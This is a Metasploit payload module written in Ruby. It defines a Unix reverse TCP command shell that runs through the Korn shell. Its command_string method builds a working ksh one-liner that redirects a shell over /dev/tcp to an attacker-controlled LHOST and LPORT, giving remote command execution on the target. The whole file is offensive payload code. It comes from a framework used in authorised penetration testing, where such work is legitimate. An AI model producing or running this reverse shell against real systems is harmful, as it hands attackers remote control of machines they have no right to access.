##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 52

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Reverse TCP (via Ksh)',
        'Description' => %q{
          Connect back and create a command shell via Ksh.  Note: Although Ksh is often
          available, please be aware it isn't usually installed by default.
        },
        'Author' => 'Wang Yihang <wangyihanger[at]gmail.com>',
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'ksh',
        'Payload' => { 'Offsets' => {}, 'Payload' => '' }
      )
    )
    register_advanced_options(
      [
        OptString.new('KSHPath', [true, 'The path to the KSH executable', 'ksh'])
      ]
    )
  end

  def generate(_opts = {})
    super + command_string
  end

  def command_string
    "#{datastore['KSHPath']} -c '#{datastore['KSHPath']} >/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} 2>&1 <&1'"
  end
end
